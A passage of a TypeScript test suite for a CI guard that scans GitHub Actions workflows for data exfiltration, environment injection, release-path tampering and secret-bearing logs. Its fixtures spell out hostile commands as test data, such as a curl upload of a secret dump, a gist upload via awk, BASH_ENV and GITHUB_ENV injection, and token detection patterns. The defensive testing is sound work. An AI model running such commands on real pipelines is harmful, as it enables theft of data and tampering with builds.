    };
    expect(findForbiddenUploadCommands(wdEdit, "t.yml", { allowlist: [wdEntry] }).map((h) => h.kind)).toContain(
      "step allowlist",
    );

    const copied = [
      "on: push",
      "jobs:",
      "  a:",
      "    runs-on: ubuntu-latest",
      "    env:",
      "      BUNDLE: src-tauri/target/universal-apple-darwin/release/bundle",
      "    steps:",
      "      - id: p",
      "        run: echo ok",
      "  leak:",
      "    runs-on: ubuntu-latest",
      "    env:",
      "      BUNDLE: /tmp/leak",
      "    steps:",
      "      - id: p",
      "        run: echo ok",
      "",
    ].join("\n");
    const copiedUnits = collectWorkflowUnits(copied).units;
    const honest = copiedUnits.find((u) => u.job === "a");
    const leak = copiedUnits.find((u) => u.job === "leak");
    if (!honest || !leak) throw new Error("copied BUNDLE jobs missing");
    const honestEntry = { file: "t.yml", job: "a", id: "p", sha256: unitHash(honest) };
    expect(findForbiddenUploadCommands(copied, "t.yml", { allowlist: [honestEntry] }).map((h) => h.kind)).toContain(
      "step allowlist",
    );
    expect(isUnitAllowlisted("t.yml", leak, [honestEntry])).toBe(false);
    expect(unitHash(leak)).not.toBe(unitHash(honest));

    const prt = wf("- id: s\n  run: echo hi", { on: "pull_request_target" });
    expect(findForbiddenUploadCommands(prt, "t.yml").map((h) => h.kind)).toContain("step allowlist");
    const pushUnit = collectWorkflowUnits(wf("- id: s\n  run: echo hi")).units[0];
    const pushEntry = { file: "t.yml", job: "t", id: "s", sha256: unitHash(pushUnit) };
    expect(findForbiddenUploadCommands(prt, "t.yml", { allowlist: [pushEntry] }).map((h) => h.kind)).toContain(
      "step allowlist",
    );
  });

  it("100f: GITHUB_ENV/PATH, interpreters, github-script, reusable workflow, BASH_ENV/ENV", () => {
    expect(writesGithubEnv('echo x >> "$GITHUB_ENV"')).toBe(true);
    expect(writesGithubPath("echo /opt >> $GITHUB_PATH")).toBe(true);
    expect(writesGithubEnv('fs.appendFileSync(process.env.GITHUB_ENV, "x=1")')).toBe(true);
    expect(hasForbiddenEnvAssignment("export BASH_ENV=/tmp/x")).toBe(true);

    const envWrites = [
      'echo LEAK=1 >> "$GITHUB_ENV"',
      "echo /tmp >> $GITHUB_PATH",
      'python3 -c \'open(os.environ["GITHUB_ENV"],"a").write("x=1")\'',
      "node -e 'require(\"fs\").appendFileSync(process.env.GITHUB_ENV,\"x=1\")'",
    ];
    for (const cmd of envWrites) {
      const kinds = findForbiddenUploadCommands(wf(`- id: s\n  run: ${JSON.stringify(cmd)}`), "t.yml").map(
        (h) => h.kind,
      );
      expect(kinds, cmd).toEqual(expect.arrayContaining(["step allowlist"]));
      expect(kinds, cmd).toEqual(
        expect.arrayContaining([expect.stringMatching(/GITHUB_ENV|GITHUB_PATH/)]),
      );
    }

    const interpreters = [
      "python3 -c 'open(\"dump.sql\",\"w\").write(\"x\")'",
      "node -e 'require(\"fs\").writeFileSync(\"dump.sql\",\"x\")'",
      "perl -e 'open F,\">dump.sql\"'",
      "awk 'BEGIN{system(\"gh gist create dump.sql\")}'",
      "make upload",
      "git -c filter.leak.smudge=cat dump.sql",
      "npm run leak",
    ];
    for (const cmd of interpreters) {
      expect(
        findForbiddenUploadCommands(wf(`- id: s\n  run: ${JSON.stringify(cmd)}`), "t.yml").map((h) => h.kind),
        cmd,
      ).toContain("step allowlist");
    }

    const script = [
      "on: push",
      "jobs:",
      "  t:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - id: s",
      "        uses: actions/github-script@v7",
      "        with:",
      "          script: |",
      "            require('fs').appendFileSync(process.env.GITHUB_ENV, 'x=1')",
      "",
    ].join("\n");
    expect(findForbiddenUploadCommands(script, "t.yml").map((h) => h.kind)).toEqual(
      expect.arrayContaining(["step allowlist", "GITHUB_ENV"]),
    );

    const reusable = [
      "on: push",
      "jobs:",
      "  leak:",
      "    uses: owner/repo/.github/workflows/upload.yml@main",
      "",
    ].join("\n");
    const reusableUnit = collectWorkflowUnits(reusable).units[0];
    expect(reusableUnit?.kind).toBe("job-uses");
    expect(reusableUnit?.uses).toMatch(/upload\.yml/);
    expect(findForbiddenUploadCommands(reusable, "t.yml").map((h) => h.kind)).toContain("step allowlist");

    const bashEnv = [
      "on: push",
      "jobs:",
      "  t:",
      "    runs-on: ubuntu-latest",
      "    env:",
      "      BASH_ENV: /tmp/leak.sh",
      "    steps:",
      "      - id: s",
      "        run: echo hi",
      "        env:",
      "          ENV: /tmp/posix.sh",
      "",
    ].join("\n");
    const unit = collectWorkflowUnits(bashEnv).units[0];
    const entry = { file: "t.yml", job: "t", id: "s", sha256: unitHash(unit) };
    expect(findForbiddenUploadCommands(bashEnv, "t.yml", { allowlist: [entry] }).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["BASH_ENV", "ENV key"]),
    );
    expect(
      findForbiddenUploadCommands(wf("- id: s\n  run: export BASH_ENV=/tmp/x"), "t.yml").map((h) => h.kind),
    ).toEqual(expect.arrayContaining(["step allowlist", "BASH_ENV"]));
  });

  it("100g: release-path writes via mv/install/dd/rsync/ln/sed/python/cp-to-var", () => {
    const writes = [
      'mv dump.sql "$DMG"',
      'install -m 644 dump "$BUNDLE"/dmg/leak.dmg',
      "dd if=dump.sql of=latest.json",
      "rsync dump.sql latest.json",
      "ln -s dump.sql RELEASE_NOTES.md",
      "sed -i s/x/y/ RELEASE_NOTES.md",
      "python3 -c 'open(\"RELEASE_NOTES.md\",\"w\").write(\"x\")'",
      'OUT=RELEASE_NOTES.md; cp dump.sql "$OUT"',
      'cp dump.sql "$STABLE_DMG"',
    ];
    for (const cmd of writes) {
      expect(hasReleasePathWrite(cmd), cmd).toBe(true);
      const kinds = findForbiddenUploadCommands(wf(`- id: s\n  run: ${JSON.stringify(cmd)}`), "release.yml").map(
        (h) => h.kind,
      );
      expect(kinds, cmd).toEqual(expect.arrayContaining(["step allowlist", "release write"]));
      expect(
        findForbiddenUploadCommands(runYaml(cmd), "cutover-migrate.yml").map((h) => h.kind),
        cmd,
      ).toContain("release write");
    }
  });

  it("100h: container on release job, deleted/reordered/duplicated steps, extra job", () => {
    const release = readFileSync(join(ROOT, ".github/workflows/release.yml"), "utf8");
    const allowlist = loadRunAllowlist();
    expect(findForbiddenUploadCommands(release, "release.yml", { allowlist })).toEqual([]);

    const withContainer = release.replace(
      /  release:\n    needs: check/,
      "  release:\n    container: evil\n    needs: check",
    );
    expect(findForbiddenUploadCommands(withContainer, "release.yml", { allowlist }).map((h) => h.kind)).toContain(
      "step allowlist",
    );

    const deletedSigning = release.replace(/\n      - id: signing\n[\s\S]*?(?=\n      - id: release-notes)/, "\n");
    expect(findForbiddenUploadCommands(deletedSigning, "release.yml", { allowlist }).map((h) => h.kind)).toContain(
      "job step ids",
    );

    const checks = readFileSync(join(ROOT, ".github/workflows/checks.yml"), "utf8");
    const deletedGuard = checks.replace(/\n      - id: guard\n[\s\S]*?(?=\n      - id: typecheck)/, "\n");
    expect(findForbiddenUploadCommands(deletedGuard, "checks.yml", { allowlist }).map((h) => h.kind)).toContain(
      "job step ids",
    );

    const publishBlock = release.match(/\n      - id: publish\n[\s\S]*?(?=\n      - id: record-sha)/)?.[0];
    if (!publishBlock) throw new Error("publish block missing");
    const reordered = release.replace(publishBlock, "\n").replace(
      /(\n      - id: checkout\n        uses: actions\/checkout[^\n]+\n        with:\n          fetch-depth: 0\n\n      - id: setup-node)/,
      `${publishBlock}$1`,
    );
    expect(findForbiddenUploadCommands(reordered, "release.yml", { allowlist }).map((h) => h.kind)).toContain(
      "job step ids",
    );

    const duplicated = release.replace(
      /(\n      - id: publish\n)/,
      "$1        name: First publish\n        run: echo one\n      - id: publish\n",
    );
    expect(findForbiddenUploadCommands(duplicated, "release.yml", { allowlist }).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["duplicate step id", "job step ids"]),
    );

    const extraJob = `${release.trimEnd()}\n  sneak:\n    runs-on: ubuntu-latest\n    steps:\n      - id: x\n        run: echo hi\n`;
    expect(findForbiddenUploadCommands(extraJob, "release.yml", { allowlist }).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["workflow jobs", "step allowlist", "job step ids"]),
    );

    const timeout = wf("- id: s\n  timeout-minutes: 5\n  run: echo hi");
    const base = collectWorkflowUnits(wf("- id: s\n  run: echo hi")).units[0];
    const timed = collectWorkflowUnits(timeout).units[0];
    expect(unitHash(timed)).not.toBe(unitHash(base));
    expect(
      findForbiddenUploadCommands(timeout, "t.yml", {
        allowlist: [{ file: "t.yml", job: "t", id: "s", sha256: unitHash(base) }],
      }).map((h) => h.kind),
    ).toContain("step allowlist");

    const runName = wf("- id: s\n  run: echo hi").replace("on: push", "run-name: leak\non: push");
    const plain = collectWorkflowUnits(wf("- id: s\n  run: echo hi")).units[0];
    expect(
      findForbiddenUploadCommands(runName, "t.yml", {
        allowlist: [{ file: "t.yml", job: "t", id: "s", sha256: unitHash(plain) }],
      }).map((h) => h.kind),
    ).toContain("step allowlist");

    expect(listHash(["a", "b"])).not.toBe(listHash(["b", "a"]));
    expect(listHash(["a", "b"])).not.toBe(listHash(["a"]));
  });

  it("pins third-party actions to full commit SHAs and requires CODEOWNERS review", () => {
    const dir = join(ROOT, ".github/workflows");
    for (const name of [
      "checks.yml",
      "ios-release.yml",
      "release.yml",
      "release-stable.yml",
      "support-manifest.yml",
    ]) {
      for (const unit of collectSteps(readFileSync(join(dir, name), "utf8"))) {
        if (!unit.uses) continue;
        expect(unit.uses, `${name} ${unit.id}`).toMatch(/@[0-9a-f]{40}\b/i);
      }
    }
    const owners = readFileSync(join(ROOT, ".github/CODEOWNERS"), "utf8");
    expect(owners).toMatch(/scripts\/guard-public-ci\.allowlist\.json\s+@phillipchan1/);
    expect(owners).toMatch(/scripts\/guard-public-ci\.mjs\s+@phillipchan1/);
    expect(owners).toMatch(/scripts\/regen-public-ci-allowlist\.mjs\s+@phillipchan1/);
    expect(owners).toMatch(/tests\/guard-public-ci\.test\.ts\s+@phillipchan1/);
    expect(owners).toMatch(/package\.json\s+@phillipchan1/);
    expect(owners).toMatch(/package-lock\.json\s+@phillipchan1/);
    expect(owners).toMatch(/\.github\/CODEOWNERS\s+@phillipchan1/);
    expect(owners).toMatch(/\.github\/workflows\/\s+@phillipchan1/);
    expect(owners).toMatch(/\.github\/actions\/\s+@phillipchan1/);
    expect(owners).toMatch(/vite\.config\.ts\s+@phillipchan1/);
    for (const name of [
      "ios-release.yml",
      "release.yml",
      "release-stable.yml",
    ]) {
      const text = readFileSync(join(dir, name), "utf8");
      expect(text, name).toMatch(/swatinem\/rust-cache@d1527c8f67ef9af357290475d4af4b0fab8f12e0\b/);
      expect(text, name).not.toMatch(/e9d7b9f/);
    }
  });

  it("rejects a multi-path dump + hash upload", () => {
    expect(() =>
      assertWorkflowUploadAllowlist(
        [
          "uses: actions/upload-artifact@sha",
          "with:",
          "  path: |",
          "    artifacts/nuvo-source.dump",
          "    artifacts/nuvo-source.sha256",
          "",
        ].join("\n"),
        "dump.yml",
      ),
    ).toThrow(/nuvo-source\.dump/);
  });

  it("treats dump/CSV paths as data uploads, not the report", () => {
    expect(looksLikeDataUpload("artifacts/nuvo-source.dump")).toBe(true);
    expect(looksLikeDataUpload("artifacts/auth-users.csv")).toBe(true);
    expect(looksLikeDataUpload("artifacts/cutover-report.md")).toBe(false);
  });

  it("fails if anything is staged for upload", () => {
    expect(() => assertStagedUpload(["artifacts/nuvo-source.dump"], { publicRepo: true })).toThrow(
      /public repo refuses data upload/,
    );
    expect(() => assertStagedUpload(["artifacts/cutover-report.md", "extra.csv"])).toThrow(
      /not allowlisted/,
    );
    expect(() => assertStagedUpload("artifacts/cutover-report.md", { publicRepo: true })).toThrow(
      /not allowlisted/,
    );
    expect(assertStagedUpload([], { publicRepo: true })).toEqual([]);
  });

  it("fails when a dump sits in the workspace artifacts folder", () => {
    const dir = tmp();
    mkdirSync(join(dir, "artifacts"), { recursive: true });
    assertWorkspaceHasNoDataFiles(dir);
    writeFileSync(join(dir, "artifacts", "nuvo-source.dump"), "not-a-real-dump");
    expect(() => assertWorkspaceHasNoDataFiles(dir)).toThrow(/nuvo-source\.dump/);
  });

  it("treats emails/CSV as row data and checksum tables as safe", () => {
    expect(logLooksLikeRowData("phil@example.com,not-a-real-hash")).toBe(true);
    expect(
      logLooksLikeRowData("| tasks | 1 | 1 | aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa |"),
    ).toBe(false);
    assertSafeMigrateLog("  tasks: source=1 target=1 hash aaa → aaa", "count/hash log");
    expect(() => assertSafeMigrateLog("id,email\naaaa,phil@example.com\n", "csv")).toThrow(
      /row data/,
    );
  });

  it("flags Google refresh tokens (1//0...)", () => {
    expect(logLooksLikeRowData("refresh 1//0gK1aBcDeFgHiJkLmNoPqRs")).toBe(true);
    expect(() => assertSafeMigrateLog("1//0gK1aBcDeFgHiJkLmNoPqRs", "refresh")).toThrow(/row data/);
  });

  it("flags Google access tokens (ya29.)", () => {
    expect(logLooksLikeRowData("access ya29.a0AfH6SMCexampletokenvalue")).toBe(true);
  });

  it("flags hex bytea (\\\\x...)", () => {
    expect(logLooksLikeRowData("enc \\x1f8b080000000000")).toBe(true);
  });

  it("flags <Buffer ...>", () => {
    expect(logLooksLikeRowData("iv <Buffer 1f 8b 08 00 00 00>")).toBe(true);
  });

  it("flags JWTs", () => {
    expect(
      logLooksLikeRowData(
        "bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.sigpayload",
      ),
    ).toBe(true);
  });

  it("flags 40+ char hex and keeps dump sha256= lines safe", () => {
    expect(logLooksLikeRowData("token " + "ab".repeat(20))).toBe(true);
    expect(
      logLooksLikeRowData(
        "verified backup: 12 bytes sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (runner only, not uploaded)",
      ),
    ).toBe(false);
  });

  it("flags pg parameters: [ dumps", () => {
    expect(logLooksLikeRowData("DETAIL:  parameters: [$1, $2]")).toBe(true);
  });

  it("asserts teed cutover logs and fails on row data", () => {
    const dir = tmp();
    expect(() => assertCutoverLogDir(join(dir, "missing"))).toThrow(/log dir missing/);
    writeFileSync(join(dir, "dump.log"), "verified backup: 12 bytes sha256=abc (runner only, not uploaded)\n");
    expect(assertCutoverLogDir(dir)).toEqual(["dump.log"]);
    writeFileSync(join(dir, "restore.log"), "auth map leaked phil@example.com\n");
    expect(() => assertCutoverLogDir(dir)).toThrow(/row data/);
  });

  it("checks.yml runs the allowlist guard", () => {
    const checks = readFileSync(join(ROOT, ".github/workflows/checks.yml"), "utf8");
    expect(checks).toMatch(/scripts\/guard-public-ci\.mjs/);
  });

  it("fuzz: workflow/job/step env, runs-on, needs, if, container, services, matrix", () => {
    const base = [
      "on: push",
      "jobs:",
      "  t:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - id: s",
      "        run: echo hi",
      "",
    ].join("\n");
    const unit = collectWorkflowUnits(base).units[0];
    const entry = { file: "t.yml", job: "t", id: "s", sha256: unitHash(unit) };
    const allow = { steps: [entry], job_steps: [{ file: "t.yml", job: "t", ids: ["s"], sha256: listHash(["s"]) }], workflow_jobs: [{ file: "t.yml", jobs: ["t"], sha256: listHash(["t"]) }] };

    const variants: [string, string][] = [
      [base.replace("on: push", "on: push\nenv:\n  LEAK: 1"), "workflow env"],
      [base.replace("    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    env:\n      LEAK: 1\n"), "job env"],
      [base.replace("        run: echo hi", "        env:\n          LEAK: 1\n        run: echo hi"), "step env"],
      [base.replace("ubuntu-latest", "windows-latest"), "runs-on"],
      [base.replace("    runs-on:", "    needs: other\n    runs-on:"), "needs"],
      [base.replace("    runs-on:", "    if: false\n    runs-on:"), "if"],
      [base.replace("    runs-on:", "    container: evil\n    runs-on:"), "container"],
      [
        base.replace(
          "    runs-on: ubuntu-latest\n",
          "    runs-on: ubuntu-latest\n    services:\n      db:\n        image: postgres:16\n",
        ),
        "services",
      ],
      [
        base.replace(
          "    runs-on: ubuntu-latest\n",
          "    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        os: [ubuntu-latest]\n",
        ),
        "matrix",
      ],
    ];
    for (const [yaml, label] of variants) {
      expect(findForbiddenUploadCommands(yaml, "t.yml", { allowlist: allow }).map((h) => h.kind), label).toContain(
        "step allowlist",
      );
    }
  });

  it("fuzz: add/rename/delete/reorder/duplicate jobs and steps, merge keys, anchors, new yml", () => {
    const base = [
      "on: push",
      "jobs:",
      "  a:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - id: one",
      "        run: echo one",
      "      - id: two",
      "        run: echo two",
      "  b:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - id: one",
      "        run: echo b",
      "",
    ].join("\n");
    const needed = (() => {
      const collected = collectWorkflowUnits(base);
      return {
        steps: collected.units.map((u) => ({
          file: "t.yml",
          job: u.job || "",
          id: u.id || "",
          sha256: unitHash(u),
        })),
        job_steps: collected.jobs.map((j) => ({
          file: "t.yml",
          job: j.name,
          ids: j.stepIds,
          sha256: listHash(j.stepIds),
        })),
        workflow_jobs: [{ file: "t.yml", jobs: collected.jobOrder, sha256: listHash(collected.jobOrder) }],
      };
    })();
    expect(findForbiddenUploadCommands(base, "t.yml", { allowlist: needed })).toEqual([]);

    const addedJob = `${base.trimEnd()}\n  sneak:\n    runs-on: ubuntu-latest\n    steps:\n      - id: x\n        run: echo hi\n`;
    expect(findForbiddenUploadCommands(addedJob, "t.yml", { allowlist: needed }).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["workflow jobs", "step allowlist", "job step ids"]),
    );

    const renamed = base.replace("  a:", "  z:");
    expect(findForbiddenUploadCommands(renamed, "t.yml", { allowlist: needed }).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["workflow jobs", "step allowlist", "job step ids"]),
    );

    const deleted = base.replace(/\n      - id: two\n        run: echo two/, "");
    expect(findForbiddenUploadCommands(deleted, "t.yml", { allowlist: needed }).map((h) => h.kind)).toContain(
      "job step ids",
    );

    const reordered = base.replace(
      "      - id: one\n        run: echo one\n      - id: two\n        run: echo two",
      "      - id: two\n        run: echo two\n      - id: one\n        run: echo one",
    );
    expect(findForbiddenUploadCommands(reordered, "t.yml", { allowlist: needed }).map((h) => h.kind)).toContain(
      "job step ids",
    );

    const duplicated = base.replace(
      "      - id: two\n        run: echo two",
      "      - id: two\n        run: echo two\n      - id: two\n        run: echo again",
    );
    expect(findForbiddenUploadCommands(duplicated, "t.yml", { allowlist: needed }).map((h) => h.kind)).toEqual(
      expect.arrayContaining(["duplicate step id", "job step ids"]),
    );

    expect(() =>
      parseWorkflowDocument(
        ["x: &a", "  uses: softprops/action-gh-release@v2", "jobs:", "  t:", "    steps:", "      - <<: *a", ""].join(
          "\n",
        ),
      ),
    ).toThrow(/merge keys|aliases\/anchors|parse error/);

    expect(() =>
      parseWorkflowDocument(
        [
          "on: push",
          "jobs:",
          "  t:",
          "    runs-on: ubuntu-latest",
          "    steps:",
          "      - &s",
          "        id: a",
          "        run: echo hi",
          "      - *s",
          "",
        ].join("\n"),
      ),
    ).toThrow(/aliases\/anchors|alias|parse error/);

    const dir = tmp();
    const wfDir = join(dir, ".github", "workflows");
    mkdirSync(wfDir, { recursive: true });
    writeFileSync(join(wfDir, "t.yml"), base);
    writeFileSync(join(wfDir, "sneak.yml"), base);
    expect(() => assertWorkflowsUploadAllowlist(wfDir)).toThrow(/step allowlist|workflow jobs/);
  });

  it("fails closed on unknown YAML tags", () => {
    expect(() => parseWorkflowDocument("foo: !!custom bar\n")).toThrow(/unknown tag|Unresolved tag/);
    expect(() => parseWorkflowDocument("foo: !local bar\n")).toThrow(/unknown tag|Unresolved tag/);
  });

  it("fails closed on unexpected case or place under .github", () => {
    const workflow = [
      "on: push",
      "jobs:",
      "  t:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - id: s",
      "        run: echo hi",
      "",
    ].join("\n");
    const action = [
      "name: demo",
      "description: d",
      "runs:",
      "  using: composite",
      "  steps:",
      "    - id: s",
      "      shell: bash",
      "      run: echo hi",
      "",
    ].join("\n");

    function githubWith(files: Record<string, string>) {
      const root = tmp();
      const github = join(root, ".github");
      for (const [rel, content] of Object.entries(files)) {
        const path = join(github, rel);
        mkdirSync(dirname(path), { recursive: true });
        writeFileSync(path, content);
      }
      return github;
    }

    const ok = githubWith({
      "workflows/ok.yml": workflow,
      "actions/demo/action.yml": action,
    });
    const listed = listGithubCiFiles(ok);
    expect(listed.unexpected).toEqual([]);
    expect(listed.workflows.map((f) => f.file)).toEqual(["ok.yml"]);
    expect(listed.actions.map((f) => f.file)).toEqual(["actions/demo/action.yml"]);

    const cases: [string, string][] = [
      ["workflows/evil.YML", workflow],
      ["workflows/evil.YAML", workflow],
      ["workflows/evil.Yml", workflow],
      ["workflows/CHECKS.yml", workflow],
      ["workflows/sub/evil.yml", workflow],
      ["evil.yml", workflow],
      ["actions/demo/extra.yml", action],
      ["actions/demo/ACTION.yml", action],
      ["actions/demo/action.YML", action],
    ];
    for (const [rel] of cases) {
      const github = githubWith({
        "workflows/ok.yml": workflow,
        [rel]: workflow,
      });
      expect(() => assertWorkflowsUploadAllowlist(github), rel).toThrow(
        /unexpected workflow-like or action file/,
      );
    }

    const renamed = githubWith({ "workflows/checks.YML": workflow });
    expect(() => assertWorkflowsUploadAllowlist(renamed)).toThrow(
      /unexpected workflow-like or action file/,
    );

    const nestedAction = githubWith({
      "workflows/ok.yml": workflow,
      "actions/deep/nested/action.yaml": action,
    });
    expect(listGithubCiFiles(nestedAction).actions.map((f) => f.file)).toEqual([
      "actions/deep/nested/action.yaml",
    ]);

    const dirNamed = tmp();
    const githubDir = join(dirNamed, ".github");
    mkdirSync(join(githubDir, "workflows", "evil.yml"), { recursive: true });
    writeFileSync(join(githubDir, "workflows", "ok.yml"), workflow);
    expect(() => assertWorkflowsUploadAllowlist(githubDir)).toThrow(/unexpected workflow-like or action file/);

    const linkRoot = tmp();
    const linkGithub = join(linkRoot, ".github");
    mkdirSync(join(linkGithub, "workflows"), { recursive: true });
    writeFileSync(join(linkGithub, "workflows", "ok.yml"), workflow);
    symlinkSync(join(linkGithub, "workflows", "ok.yml"), join(linkGithub, "workflows", "evil.yml"));
    expect(() => assertWorkflowsUploadAllowlist(linkGithub)).toThrow(/unexpected workflow-like or action file/);
  });

  it("hashes and allowlists composite action steps with the same deny rules", () => {
    const action = [
      "name: demo",
      "description: d",
      "runs:",
      "  using: composite",
      "  steps:",
      "    - id: s",
      "      shell: bash",
      "      run: echo hi",
      "",
    ].join("\n");
    const collected = collectWorkflowUnits(action, { kind: "action" });
    expect(collected.kind).toBe("action");
    expect(collected.jobOrder).toEqual([COMPOSITE_JOB_NAME]);
    expect(collected.units[0]?.job).toBe(COMPOSITE_JOB_NAME);
    expect(collected.units[0]?.id).toBe("s");

    const file = "actions/demo/action.yml";
    const needed = {
      steps: collected.units.map((u) => ({
        file,
        job: u.job || "",
        id: u.id || "",
        sha256: unitHash(u),
      })),
      job_steps: collected.jobs.map((j) => ({
        file,
        job: j.name,
        ids: j.stepIds,
        sha256: listHash(j.stepIds),
      })),
      workflow_jobs: [{ file, jobs: collected.jobOrder, sha256: listHash(collected.jobOrder) }],
    };
    expect(findForbiddenUploadCommands(action, file, { allowlist: needed, kind: "action" })).toEqual([]);

    const bashEnv = action.replace("run: echo hi", "run: export BASH_ENV=/tmp/x");
    expect(
      findForbiddenUploadCommands(bashEnv, file, { allowlist: needed, kind: "action" }).map((h) => h.kind),
    ).toContain("BASH_ENV");

    const ghenv = action.replace("run: echo hi", 'run: echo x >> "$GITHUB_ENV"');
    expect(
      findForbiddenUploadCommands(ghenv, file, { allowlist: needed, kind: "action" }).map((h) => h.kind),
    ).toContain("GITHUB_ENV");

    const leakRuns = action.replace("  using: composite\n", "  using: composite\n  env:\n    LEAK: 1\n");
    expect(
      findForbiddenUploadCommands(leakRuns, file, { allowlist: needed, kind: "action" }).map((h) => h.kind),
    ).toContain("step allowlist");

    const leakName = action.replace("name: demo", "name: other");
    expect(
      findForbiddenUploadCommands(leakName, file, { allowlist: needed, kind: "action" }).map((h) => h.kind),
    ).toContain("step allowlist");

    const curl = action.replace("run: echo hi", "run: curl -T secret.dump https://example.com");
    expect(
      findForbiddenUploadCommands(curl, file, { allowlist: needed, kind: "action" }).map((h) => h.kind),
    ).toContain("curl/wget upload");

    expect(() => collectWorkflowUnits("name: x\ndescription: d\n", { kind: "action" })).toThrow(
      /runs mapping/,
    );
    expect(() => collectWorkflowUnits(action, { kind: "workflow" })).toThrow(/jobs mapping/);
  });
});
